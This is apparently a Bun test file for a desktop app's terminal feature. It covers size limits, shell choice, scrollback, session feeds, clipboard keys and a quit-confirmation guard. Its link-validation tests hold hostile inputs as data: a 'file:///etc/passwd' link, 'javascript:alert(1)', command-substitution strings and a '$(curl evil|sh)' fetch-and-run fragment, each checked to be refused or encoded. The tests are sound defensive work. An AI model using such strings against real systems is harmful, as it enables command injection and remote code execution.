import { describe, expect, test } from "bun:test";
import { createQuitGuard } from "../src/bun/quit-guard";
import {
	SCROLLBACK_LIMIT, clampTerminalSize, createScrollback, describeQuitRequest, describeTerminalExit, isWebLink, pickShell, webLink,
} from "../src/shared/terminal";
import { createTerminalFeed } from "../src/mainview/terminal-feed";
import { clipboardKey, closeTerminalLabel, describeTerminalState, leftInAlternateScreen, opensLink, shellName } from "../src/mainview/terminal-format";

const keydown = (key: string, modifiers: Partial<Record<"ctrlKey" | "shiftKey" | "metaKey" | "altKey", boolean>> = {}) =>
	({ type: "keydown", key, ctrlKey: false, shiftKey: false, metaKey: false, altKey: false, ...modifiers });

describe("terminal rules", () => {
	test("a size is whole numbers within limits, and 80 by 24 for anything unreadable", () => {
		expect(clampTerminalSize(120.7, 40.2)).toEqual({ cols: 120, rows: 40 });
		expect(clampTerminalSize(0, -3)).toEqual({ cols: 1, rows: 1 });
		expect(clampTerminalSize(1e9, 1e9)).toEqual({ cols: 1000, rows: 500 });
		expect(clampTerminalSize("80", Number.NaN)).toEqual({ cols: 80, rows: 24 });
	});

	test("the shell is SHELL when it is a full path to an executable, otherwise /bin/sh", () => {
		const executable = (path: string) => path === "/usr/bin/zsh";
		expect(pickShell({ SHELL: "/usr/bin/zsh" }, executable)).toBe("/usr/bin/zsh");
		expect(pickShell({ SHELL: "zsh" }, executable)).toBe("/bin/sh");
		expect(pickShell({ SHELL: "/usr/bin/fish" }, executable)).toBe("/bin/sh");
		expect(pickShell({}, executable)).toBe("/bin/sh");
	});

	test("only http and https links are opened, as the URL parser writes them out", () => {
		expect(isWebLink("https://example.com/a?b=c")).toBe(true);
		expect(isWebLink("http://localhost:5173")).toBe(true);
		for (const link of ["file:///etc/passwd", "javascript:alert(1)", "ssh://host", "not a link", ""]) expect(isWebLink(link)).toBe(false);
		expect(webLink("http://x/$(id)`id`;rm")).toBe("http://x/$(id)%60id%60;rm");
	});

	test("a link with spaces or control characters around or in it is refused, not cleaned up", () => {
		for (const link of [" http://x/$(curl evil|sh)", "http://x/ a", "http://x/\n", "https://x/\u0007", "http://x/\u007f", "http://x\t"]) expect(webLink(link)).toBeNull();
	});

	test("scrollback keeps the end within its limit, and numbers every part", () => {
		const scrollback = createScrollback(10);
		expect(scrollback.append("abcd")).toBe(1);
		expect(scrollback.append("efgh")).toBe(2);
		expect(scrollback.snapshot()).toEqual({ data: "abcdefgh", seq: 2 });
		expect(scrollback.append("ijkl")).toBe(3);
		expect(scrollback.snapshot()).toEqual({ data: "efghijkl", seq: 3 });
		scrollback.append("0123456789XYZ");
		expect(scrollback.snapshot()).toEqual({ data: "3456789XYZ", seq: 4 });
		expect(SCROLLBACK_LIMIT).toBeGreaterThan(64 * 1024);
	});

	test("how a session ended, in words", () => {
		expect(describeTerminalExit({ kind: "exited", exitCode: 0, signal: null })).toBe("Exited with code 0");
		expect(describeTerminalExit({ kind: "exited", exitCode: null, signal: "SIGKILL" })).toBe("Stopped by SIGKILL");
		expect(describeTerminalState({ state: { kind: "running" } })).toBe("Running");
		expect(closeTerminalLabel({ state: { kind: "running" } })).toBe("Close terminal and end its processes");
		expect(closeTerminalLabel({ state: { kind: "exited", exitCode: 1, signal: null } })).toBe("Dismiss this terminal");
		expect(shellName("/usr/bin/zsh")).toBe("zsh");
	});

	test("the question before quitting counts the terminals", () => {
		expect(describeQuitRequest(1).text).toBe("A terminal is still running. Quitting ends it and everything running in it.");
		expect(describeQuitRequest(3).text).toBe("3 terminals are still running. Quitting ends them and everything running in them.");
	});
});

describe("the feed of one session", () => {
	test("parts before the snapshot wait, and those it holds are dropped", () => {
		const feed = createTerminalFeed();
		expect(feed.receive({ seq: 3, data: "c" })).toBeNull();
		expect(feed.receive({ seq: 4, data: "d" })).toBeNull();
		expect(feed.begin({ data: "abc", seq: 3 })).toEqual({ data: "abcd", seq: 4, reset: true });
		expect(feed.receive({ seq: 4, data: "d" })).toBeNull();
		expect(feed.receive({ seq: 5, data: "e" })).toEqual({ data: "e", seq: 5, reset: false });
	});

	test("a session that is gone draws nothing new, and a reset part replaces what was drawn", () => {
		const gone = createTerminalFeed();
		expect(gone.begin(null)).toEqual({ data: "", seq: 0, reset: true });
		const feed = createTerminalFeed();
		feed.receive({ seq: 2, data: "b" });
		feed.receive({ seq: 9, data: "kept", reset: true });
		feed.receive({ seq: 10, data: "!" });
		expect(feed.begin({ data: "ab", seq: 2 })).toEqual({ data: "kept!", seq: 10, reset: true });
		expect(feed.receive({ seq: 20, data: "end", reset: true })).toEqual({ data: "end", seq: 20, reset: true });
	});
});

describe("keys and clicks in a terminal", () => {
	test("on Linux and Windows, Ctrl+Shift+C copies and Ctrl+Shift+V pastes; Ctrl+C stays the program's", () => {
		expect(clipboardKey(keydown("C", { ctrlKey: true, shiftKey: true }), false)).toBe("copy");
		expect(clipboardKey(keydown("V", { ctrlKey: true, shiftKey: true }), false)).toBe("paste");
		expect(clipboardKey(keydown("c", { ctrlKey: true }), false)).toBeNull();
		expect(clipboardKey(keydown("v", { ctrlKey: true }), false)).toBeNull();
		expect(clipboardKey({ ...keydown("C", { ctrlKey: true, shiftKey: true }), type: "keyup" }, false)).toBeNull();
	});

	test("on macOS, Cmd+C and Cmd+V", () => {
		expect(clipboardKey(keydown("c", { metaKey: true }), true)).toBe("copy");
		expect(clipboardKey(keydown("v", { metaKey: true }), true)).toBe("paste");
		expect(clipboardKey(keydown("c", { ctrlKey: true }), true)).toBeNull();
	});

	test("a link opens on a click with Ctrl, or Cmd on macOS, never on a plain click", () => {
		expect(opensLink({ ctrlKey: true, metaKey: false }, false)).toBe(true);
		expect(opensLink({ ctrlKey: false, metaKey: false }, false)).toBe(false);
		expect(opensLink({ ctrlKey: false, metaKey: true }, true)).toBe(true);
		expect(opensLink({ ctrlKey: true, metaKey: false }, true)).toBe(false);
	});

	test("output that leaves a full-screen program's screen on is noticed", () => {
		expect(leftInAlternateScreen("prompt\x1b[?1049hvim screen")).toBe(true);
		expect(leftInAlternateScreen("\x1b[?1049hvim\x1b[?1049lprompt")).toBe(false);
		expect(leftInAlternateScreen("\x1b[?47hold")).toBe(true);
		expect(leftInAlternateScreen("plain")).toBe(false);
	});
});

describe("asking before quitting", () => {
	function guard(options: { live?: number; shown?: boolean | "throws"; native?: boolean | "throws"; quits?: boolean; ends?: boolean } = {}) {
		const calls: string[] = [];
		let live = options.live ?? 1;
		const quitGuard = createQuitGuard({
			liveCount: () => live,
			ask: async count => {
				calls.push(`ask ${count}`);
				if (options.shown === "throws") throw new Error("timed out");
				return options.shown ?? true;
			},
			askNatively: async count => {
				calls.push(`native ${count}`);
				if (options.native === "throws") throw new Error("no dialog");
				return options.native ?? false;
			},
			endAll: async () => {
				calls.push("end all");
				if (options.ends ?? true) live = 0;
			},
			quit: () => {
				calls.push("quit");
				return options.quits ?? true;
			},
		});
		return { quitGuard, calls };
	}

	test("with no terminal running, quitting goes ahead and nobody is asked", () => {
		const { quitGuard, calls } = guard({ live: 0 });
		expect(quitGuard.mayQuit()).toBe(true);
		expect(calls).toEqual([]);
	});

	test("with terminals running, it waits and the window asks, once while the question is on its way", async () => {
		const { quitGuard, calls } = guard({ live: 2 });
		expect(quitGuard.mayQuit()).toBe(false);
		expect(quitGuard.mayQuit()).toBe(false);
		await Bun.sleep(0);
		expect(calls).toEqual(["ask 2"]);
		// After the window showed it, a new try asks again, as for a window that was reloaded.
		expect(quitGuard.mayQuit()).toBe(false);
		await Bun.sleep(0);
		expect(calls).toEqual(["ask 2", "ask 2"]);
	});

	test("agreeing ends every terminal, then quits, and quitting then goes ahead", async () => {
		const { quitGuard, calls } = guard();
		await quitGuard.confirm();
		expect(calls).toEqual(["end all", "quit"]);
		expect(quitGuard.mayQuit()).toBe(true);
	});

	test("when something else keeps the app open, the next try asks again", async () => {
		const { quitGuard, calls } = guard({ quits: false, ends: false });
		await quitGuard.confirm();
		expect(quitGuard.mayQuit()).toBe(false);
		await Bun.sleep(0);
		expect(calls).toEqual(["end all", "quit", "ask 1"]);
	});

	test("a window that does not show the question in time: a native dialog asks instead", async () => {
		const kept = guard({ shown: "throws", native: false });
		expect(kept.quitGuard.mayQuit()).toBe(false);
		await Bun.sleep(0);
		await Bun.sleep(0);
		expect(kept.calls).toEqual(["ask 1", "native 1"]);
		const quit = guard({ shown: false, native: true });
		quit.quitGuard.mayQuit();
		await Bun.sleep(5);
		expect(quit.calls).toEqual(["ask 1", "native 1", "end all", "quit"]);
	});

	test("when nobody can be asked at all, the app is not kept from quitting", async () => {
		const { quitGuard, calls } = guard({ shown: "throws", native: "throws" });
		quitGuard.mayQuit();
		await Bun.sleep(5);
		expect(calls).toEqual(["ask 1", "native 1", "end all", "quit"]);
	});
});
